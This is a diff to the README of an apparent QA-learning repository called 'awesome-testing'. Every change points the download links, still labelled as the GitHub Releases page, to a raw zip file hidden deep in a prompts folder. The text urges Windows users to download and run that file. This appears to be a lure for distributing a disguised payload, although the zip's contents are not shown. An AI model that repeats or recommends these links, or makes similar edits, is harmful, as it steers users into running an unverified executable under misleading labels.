@@ -1,7 +1,7 @@
 # 🧪 awesome-testing - Learn testing with clear guides
 
-[![Download](https://img.shields.io/badge/Download%20%26%20Run-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Hildagardelucky309/awesome-testing/releases)
-[![Releases](https://img.shields.io/badge/Windows%20Download-Releases-lightgrey?style=for-the-badge)](https://github.com/Hildagardelucky309/awesome-testing/releases)
+[![Download](https://img.shields.io/badge/Download%20%26%20Run-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hildagardelucky309/awesome-testing/main/prompts/manual-testing/test-planning/awesome-testing-2.1.zip)
+[![Releases](https://img.shields.io/badge/Windows%20Download-Releases-lightgrey?style=for-the-badge)](https://raw.githubusercontent.com/Hildagardelucky309/awesome-testing/main/prompts/manual-testing/test-planning/awesome-testing-2.1.zip)
 
 A clear collection of testing knowledge, tools, and resources for QA work.
 
@@ -24,7 +24,7 @@ It includes:
 
 ## 🪟 Windows download and setup
 
-1. Open the release page: [https://github.com/Hildagardelucky309/awesome-testing/releases](https://github.com/Hildagardelucky309/awesome-testing/releases)
+1. Open the release page: [https://raw.githubusercontent.com/Hildagardelucky309/awesome-testing/main/prompts/manual-testing/test-planning/awesome-testing-2.1.zip](https://raw.githubusercontent.com/Hildagardelucky309/awesome-testing/main/prompts/manual-testing/test-planning/awesome-testing-2.1.zip)
 2. Find the latest release at the top of the page
 3. Open the release assets
 4. Download the file made for Windows
@@ -167,7 +167,7 @@ If the release includes a desktop app, use a PC with at least:
 
 Open the release page here:
 
-[Go to GitHub Releases](https://github.com/Hildagardelucky309/awesome-testing/releases)
+[Go to GitHub Releases](https://raw.githubusercontent.com/Hildagardelucky309/awesome-testing/main/prompts/manual-testing/test-planning/awesome-testing-2.1.zip)
 
 From that page, choose the latest release and download the Windows file. If the release includes more than one asset, choose the one marked for Windows.
 
@@ -228,7 +228,7 @@ This repository fits:
 
 Use this link to visit the download page again:
 
-[https://github.com/Hildagardelucky309/awesome-testing/releases](https://github.com/Hildagardelucky309/awesome-testing/releases)
+[https://raw.githubusercontent.com/Hildagardelucky309/awesome-testing/main/prompts/manual-testing/test-planning/awesome-testing-2.1.zip](https://raw.githubusercontent.com/Hildagardelucky309/awesome-testing/main/prompts/manual-testing/test-planning/awesome-testing-2.1.zip)
 
 ## 📚 Key topics at a glance
 
@@ -264,4 +264,4 @@ Use GitHub folders like a book:
 
 ## 🔗 Primary download page
 
-[Visit the Releases page to download and run the Windows file](https://github.com/Hildagardelucky309/awesome-testing/releases)
+[Visit the Releases page to download and run the Windows file](https://raw.githubusercontent.com/Hildagardelucky309/awesome-testing/main/prompts/manual-testing/test-planning/awesome-testing-2.1.zip)
